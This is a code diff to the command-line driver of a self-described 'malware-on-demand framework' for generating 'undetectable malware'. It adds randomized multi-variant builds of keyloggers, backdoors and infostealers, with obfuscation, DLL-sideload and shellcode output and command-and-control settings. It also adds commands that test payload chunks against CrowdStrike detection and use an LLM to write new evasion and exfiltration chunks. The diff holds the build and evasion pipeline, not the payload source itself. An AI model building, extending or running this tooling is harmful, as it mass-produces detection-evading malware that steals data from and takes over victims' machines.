@@ -9,9 +9,9 @@ Subcommands:
   analyze      — Run DB queries and show context without generation
 
 Usage:
-  python -m malware_gen_framework generate --spec target.yaml --output ./results
-  python -m malware_gen_framework provision --os windows-11
-  python -m malware_gen_framework run --spec target.yaml --max-iterations 5
+  python -m atelier generate --spec target.yaml --output ./results
+  python -m atelier provision --os windows-11
+  python -m atelier run --spec target.yaml --max-iterations 5
 """
 
 import argparse
@@ -454,6 +454,46 @@ async def cmd_portal(args) -> int:
     return 0
 
 
+async def cmd_validate(args) -> int:
+    """Validate chunks against CrowdStrike."""
+    import subprocess
+    cmd = [sys.executable, str(Path(__file__).parent / "validate.py")]
+
+    if args.recipe:
+        cmd.extend(["--recipe", args.recipe])
+    if args.category:
+        cmd.extend(["--category", args.category])
+    if args.chunks:
+        cmd.extend(["--chunks", args.chunks])
+    if args.thorough:
+        cmd.append("--thorough")
+    if args.update_registry:
+        cmd.append("--update-registry")
+    if args.dry_run:
+        cmd.append("--dry-run")
+
+    result = subprocess.run(cmd)
+    return result.returncode
+
+
+async def cmd_expand(args) -> int:
+    """Create new chunks with LLM assistance."""
+    import subprocess
+    cmd = [sys.executable, str(Path(__file__).parent / "expand.py")]
+
+    cmd.extend(["--type", args.type])
+    cmd.extend(["--description", args.description])
+    if args.count > 1:
+        cmd.extend(["--count", str(args.count)])
+    if args.validate:
+        cmd.append("--validate")
+    if args.max_attempts != 5:
+        cmd.extend(["--max-attempts", str(args.max_attempts)])
+
+    result = subprocess.run(cmd)
+    return result.returncode
+
+
 async def cmd_chunk(args) -> int:
     """Assemble malware from chunk recipes (no LLM needed)."""
     import sys
@@ -508,125 +548,168 @@ async def cmd_chunk(args) -> int:
         if not malware_type:
             malware_type = "infostealer"
     timestamp = time.strftime("%Y%m%d_%H%M%S")
-    pkg_dir = output_dir / f"chunk_{malware_type}_{timestamp}"
-    pkg_dir.mkdir(parents=True, exist_ok=True)
-
-    src_out = pkg_dir / "source.c"
-    source = assemble(str(recipe_path), extra_vars)
-
+    num_variants = getattr(args, "variants", 1) or 1
+    use_randomize = getattr(args, "randomize", False) or num_variants > 1
+    base_seed = getattr(args, "seed", None)
     obf_level = getattr(args, "obfuscate", None) or "none"
-    if obf_level != "none":
-        from templates.chunks.obfuscate import obfuscate as obf_fn
-        source = obf_fn(source, level=obf_level)
-        print(f"Obfuscated: level={obf_level}")
 
-    src_out.write_text(source)
-    print(f"Assembled: {src_out} ({len(source)} chars)")
+    # Root package dir for all variants
+    if num_variants > 1:
+        pkg_root = output_dir / f"chunk_{malware_type}_{timestamp}_variants"
+        pkg_root.mkdir(parents=True, exist_ok=True)
+        print(f"=== Generating {num_variants} variants ===")
+    else:
+        pkg_root = None
 
-    shutil.copy2(str(recipe_path), str(pkg_dir / "recipe.yaml"))
+    all_variants = []
 
-    parse_script = Path(__file__).parent / "scripts" / "parse_exfil.py"
-    if parse_script.exists():
-        shutil.copy2(str(parse_script), str(pkg_dir / "parse_exfil.py"))
-
-    if malware_type == "keylogger":
-        deploy_script = Path(__file__).parent / "scripts" / "deploy_keylogger.sh"
-        if deploy_script.exists():
-            shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
-    elif malware_type == "backdoor":
-        deploy_script = Path(__file__).parent / "scripts" / "deploy_backdoor.sh"
-        if deploy_script.exists():
-            shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
-    elif malware_type == "infostealer":
-        deploy_script = Path(__file__).parent / "scripts" / "deploy_ad_recon.sh"
-        if deploy_script.exists():
-            shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
-
-    build_info = (
-        f"type: {malware_type}\n"
-        f"recipe: {recipe_path.name}\n"
-        f"obfuscation: {obf_level}\n"
-        f"timestamp: {timestamp}\n"
-        f"source_chars: {len(source)}\n"
-    )
-
-    exe_out = None
-    if args.compile:
-        import yaml as _yaml
-        with open(recipe_path) as _rf:
-            _recipe_data = _yaml.safe_load(_rf)
-        _arch = _recipe_data.get("arch", "")
-        _compiler = getattr(args, "compiler", "mingw") or "mingw"
-        _compile_fn = compile_zig if _compiler == "zig" else compile_mingw
-        dll_archs = {"arch/dll_sideload", "arch/dll_rundll", "arch/dll_cpl"}
-        if _arch in dll_archs:
-            _def_name = _recipe_data.get("def_file", "version.def")
-            _def_path = str(Path(__file__).parent / "templates" / "chunks" / "arch" / _def_name)
-            if _arch == "arch/dll_cpl":
-                exe_out = pkg_dir / "payload.cpl"
-            else:
-                exe_out = pkg_dir / "payload.dll"
-            ok = _compile_fn(str(src_out), str(exe_out), dll_def=_def_path)
+    for variant_idx in range(num_variants):
+        if num_variants > 1:
+            pkg_dir = pkg_root / f"variant_{variant_idx + 1:02d}"
+            print(f"\n--- Variant {variant_idx + 1}/{num_variants} ---")
         else:
-            exe_out = pkg_dir / "payload.exe"
-            ok = _compile_fn(str(src_out), str(exe_out))
-        if not ok:
-            return 1
-        build_info += f"binary_size: {exe_out.stat().st_size}\n"
+            pkg_dir = output_dir / f"chunk_{malware_type}_{timestamp}"
+        pkg_dir.mkdir(parents=True, exist_ok=True)
 
-    if getattr(args, "format", "exe") == "shellcode" and exe_out and exe_out.exists():
-        from templates.chunks.assembler import extract_shellcode
-        sc_out = pkg_dir / "payload.bin"
-        if extract_shellcode(str(exe_out), str(sc_out)):
-            build_info += f"shellcode_size: {sc_out.stat().st_size}\n"
+        # Seed for randomization: use variant index to get different results
+        seed = (base_seed + variant_idx) if base_seed is not None else (int(timestamp.replace("_", "")) + variant_idx * 1000) if use_randomize else None
+
+        src_out = pkg_dir / "source.c"
+        skip_disabled = not getattr(args, "include_burned", False)
+        source = assemble(str(recipe_path), extra_vars, randomize=use_randomize, seed=seed,
+                          skip_disabled=skip_disabled)
+
+        if obf_level != "none":
+            from templates.chunks.obfuscate import obfuscate as obf_fn
+            source = obf_fn(source, level=obf_level)
+            if variant_idx == 0:
+                print(f"Obfuscated: level={obf_level}")
+
+        src_out.write_text(source)
+        print(f"Assembled: {src_out} ({len(source)} chars)")
+
+        shutil.copy2(str(recipe_path), str(pkg_dir / "recipe.yaml"))
+
+        all_variants.append({
+            "dir": pkg_dir,
+            "src": src_out,
+            "seed": seed,
+        })
+
+    # Process each variant: copy scripts, compile, optionally test
+    parse_script = Path(__file__).parent / "scripts" / "parse_exfil.py"
+    deploy_scripts = {
+        "keylogger": Path(__file__).parent / "scripts" / "deploy_keylogger.sh",
+        "backdoor": Path(__file__).parent / "scripts" / "deploy_backdoor.sh",
+        "infostealer": Path(__file__).parent / "scripts" / "deploy_ad_recon.sh",
+    }
+
+    import yaml as _yaml
+    with open(recipe_path) as _rf:
+        _recipe_data = _yaml.safe_load(_rf)
+    _arch = _recipe_data.get("arch", "")
+    _compiler = getattr(args, "compiler", "mingw") or "mingw"
+    _compile_fn = compile_zig if _compiler == "zig" else compile_mingw
+    dll_archs = {"arch/dll_sideload", "arch/dll_rundll", "arch/dll_cpl"}
 
     rc = 0
     c2_port = os.environ.get("C2_PORT", extra_vars.get("C2_PORT", "9001"))
     c2_ip = extra_vars.get("C2_IP", "10.0.2.2")
 
-    if args.test:
-        import subprocess
-        scripts_dir = Path(__file__).parent / "scripts"
-        if malware_type == "keylogger":
-            test_script = scripts_dir / "deploy_keylogger.sh"
-        elif malware_type == "backdoor":
-            test_script = scripts_dir / "deploy_backdoor.sh"
-        elif malware_type == "infostealer":
-            test_script = scripts_dir / "deploy_ad_recon.sh"
-        else:
-            test_script = scripts_dir / "test_template.sh"
-        if not test_script.exists():
-            print(f"{test_script.name} not found — skipping VM test")
-        else:
-            test_input = str(exe_out) if exe_out and exe_out.exists() else str(src_out)
-            test_env = os.environ.copy()
-            test_env["C2_RESULTS_DIR"] = str(pkg_dir)
-            if malware_type == "keylogger":
-                cmd = ["bash", str(test_script), test_input, c2_port]
-            elif malware_type == "backdoor":
-                cmd = ["bash", str(test_script), test_input, c2_ip, c2_port]
-            elif malware_type == "infostealer":
-                cmd = ["bash", str(test_script), test_input]
+    for var in all_variants:
+        pkg_dir = var["dir"]
+        src_out = var["src"]
+
+        # Copy helper scripts
+        if parse_script.exists():
+            shutil.copy2(str(parse_script), str(pkg_dir / "parse_exfil.py"))
+        deploy_script = deploy_scripts.get(malware_type)
+        if deploy_script and deploy_script.exists():
+            shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
+
+        build_info = (
+            f"type: {malware_type}\n"
+            f"recipe: {recipe_path.name}\n"
+            f"obfuscation: {obf_level}\n"
+            f"randomize: {use_randomize}\n"
+            f"seed: {var['seed']}\n"
+            f"timestamp: {timestamp}\n"
+            f"source_chars: {src_out.stat().st_size}\n"
+        )
+
+        exe_out = None
+        if args.compile:
+            if _arch in dll_archs:
+                _def_name = _recipe_data.get("def_file", "version.def")
+                _def_path = str(Path(__file__).parent / "templates" / "chunks" / "arch" / _def_name)
+                if _arch == "arch/dll_cpl":
+                    exe_out = pkg_dir / "payload.cpl"
+                else:
+                    exe_out = pkg_dir / "payload.dll"
+                ok = _compile_fn(str(src_out), str(exe_out), dll_def=_def_path)
             else:
-                cmd = ["bash", str(test_script)]
-                if args.snapshot:
-                    cmd.append("--snapshot")
-                cmd.extend([test_input, c2_ip, c2_port])
-            rc = subprocess.run(cmd, env=test_env).returncode
-            build_info += f"vm_test: {'PASS' if rc == 0 else 'FAIL'}\n"
+                exe_out = pkg_dir / "payload.exe"
+                ok = _compile_fn(str(src_out), str(exe_out))
+            if not ok:
+                return 1
+            build_info += f"binary_size: {exe_out.stat().st_size}\n"
+            var["exe"] = exe_out
 
-            for f in pkg_dir.glob("exfil_*.bin"):
-                build_info += f"exfil: {f.name} ({f.stat().st_size} bytes)\n"
+        if getattr(args, "format", "exe") == "shellcode" and exe_out and exe_out.exists():
+            from templates.chunks.assembler import extract_shellcode
+            sc_out = pkg_dir / "payload.bin"
+            if extract_shellcode(str(exe_out), str(sc_out)):
+                build_info += f"shellcode_size: {sc_out.stat().st_size}\n"
 
-    (pkg_dir / "build_info.txt").write_text(build_info)
+        # Only test if --test is specified (NOT with --variants by default)
+        if args.test and num_variants == 1:
+            import subprocess
+            scripts_dir = Path(__file__).parent / "scripts"
+            test_script = deploy_scripts.get(malware_type) or scripts_dir / "test_template.sh"
+            if not test_script.exists():
+                print(f"{test_script.name} not found — skipping VM test")
+            else:
+                test_input = str(exe_out) if exe_out and exe_out.exists() else str(src_out)
+                test_env = os.environ.copy()
+                test_env["C2_RESULTS_DIR"] = str(pkg_dir)
+                if malware_type == "keylogger":
+                    cmd = ["bash", str(test_script), test_input, c2_port]
+                elif malware_type == "backdoor":
+                    cmd = ["bash", str(test_script), test_input, c2_ip, c2_port]
+                elif malware_type == "infostealer":
+                    cmd = ["bash", str(test_script), test_input]
+                else:
+                    cmd = ["bash", str(test_script)]
+                    if args.snapshot:
+                        cmd.append("--snapshot")
+                    cmd.extend([test_input, c2_ip, c2_port])
+                rc = subprocess.run(cmd, env=test_env).returncode
+                build_info += f"vm_test: {'PASS' if rc == 0 else 'FAIL'}\n"
 
-    # Symlink results/latest -> this package for convenience
-    latest = output_dir / "latest"
-    if latest.is_symlink() or latest.exists():
-        latest.unlink()
-    latest.symlink_to(pkg_dir.name)
+                for f in pkg_dir.glob("exfil_*.bin"):
+                    build_info += f"exfil: {f.name} ({f.stat().st_size} bytes)\n"
 
-    print(f"Package: {pkg_dir}/")
+        (pkg_dir / "build_info.txt").write_text(build_info)
+
+    # Report summary for multi-variant builds
+    if num_variants > 1:
+        print(f"\n=== Generated {num_variants} variants ===")
+        for i, var in enumerate(all_variants, 1):
+            exe = var.get("exe")
+            size = exe.stat().st_size if exe and exe.exists() else 0
+            print(f"  {i}: {var['dir'].name} ({size} bytes)")
+        print(f"\nPackage: {pkg_root}/")
+        latest = output_dir / "latest"
+        if latest.is_symlink() or latest.exists():
+            latest.unlink()
+        latest.symlink_to(pkg_root.name)
+    else:
+        print(f"Package: {pkg_dir}/")
+        latest = output_dir / "latest"
+        if latest.is_symlink() or latest.exists():
+            latest.unlink()
+        latest.symlink_to(pkg_dir.name)
+
     return rc
 
 
@@ -672,7 +755,7 @@ async def cmd_analyze(args) -> int:
 
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
-        prog="malware_gen_framework",
+        prog="atelier",
         description="Malware-on-demand framework — generate undetectable malware for target environments",
     )
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable debug logging")
@@ -902,6 +985,14 @@ def build_parser() -> argparse.ArgumentParser:
                               default="none", help="Source-level obfuscation (default: none)")
     chunk_parser.add_argument("--format", choices=["exe", "dll", "shellcode"], default="exe",
                               help="Output format (default: exe)")
+    chunk_parser.add_argument("--variants", type=int, default=1, metavar="N",
+                              help="Generate N randomized variants (default: 1)")
+    chunk_parser.add_argument("--randomize", action="store_true",
+                              help="Enable chunk randomization (auto-enabled with --variants > 1)")
+    chunk_parser.add_argument("--seed", type=int, default=None,
+                              help="Random seed for reproducible builds (only with --variants=1)")
+    chunk_parser.add_argument("--include-burned", action="store_true",
+                              help="Include burned/disabled chunks (normally skipped)")
 
     # -- analyze ------------------------------------------------------------
     ana_parser = subparsers.add_parser("analyze", help="Query DBs and show context without generating code")
@@ -922,6 +1013,30 @@ def build_parser() -> argparse.ArgumentParser:
         "--mode", choices=["local-run", "cloud-run"], default="local-run",
         help="local-run: local LLM for everything (default). cloud-run: chunk code gen via Fugu/Sakana AI (requires FUGU_API_KEY).",
     )
+
+    # -- validate ---------------------------------------------------------------
+    val_parser = subparsers.add_parser(
+        "validate",
+        help="Validate chunks against CrowdStrike (requires VM running)",
+    )
+    val_parser.add_argument("--recipe", help="Base recipe to use for validation")
+    val_parser.add_argument("--category", help="Test all chunks in category (collectors, evasion, exfil)")
+    val_parser.add_argument("--chunks", help="Comma-separated list of specific chunks to test")
+    val_parser.add_argument("--thorough", action="store_true", help="Test each chunk individually")
+    val_parser.add_argument("--update-registry", action="store_true", help="Update registry with results")
+    val_parser.add_argument("--dry-run", action="store_true", help="Show what would be tested")
+
+    # -- expand -----------------------------------------------------------------
+    exp_parser = subparsers.add_parser(
+        "expand",
+        help="Create new chunks with LLM assistance and validation",
+    )
+    exp_parser.add_argument("--type", required=True, choices=["collector", "evasion", "exfil"],
+                            help="Type of chunk to create")
+    exp_parser.add_argument("--description", required=True, help="Description of what the chunk should do")
+    exp_parser.add_argument("--count", type=int, default=1, help="Number of variants to create")
+    exp_parser.add_argument("--validate", action="store_true", help="Validate against CrowdStrike after creation")
+    exp_parser.add_argument("--max-attempts", type=int, default=5, help="Max attempts to fix compilation errors")
 
     return parser
 
@@ -987,6 +1102,12 @@ def _validate_early(args) -> None:
 
 
 def main():
+    # Ensure hermes module is importable
+    import sys
+    root_dir = str(Path(__file__).parent)
+    if root_dir not in sys.path:
+        sys.path.insert(0, root_dir)
+
     parser = build_parser()
     args = parser.parse_args()
 
@@ -1002,6 +1123,8 @@ def main():
         "clean":     cmd_clean,
         "analyze":   cmd_analyze,
         "portal":    cmd_portal,
+        "validate":  cmd_validate,
+        "expand":    cmd_expand,
     }
 
     handler = command_map.get(args.command)
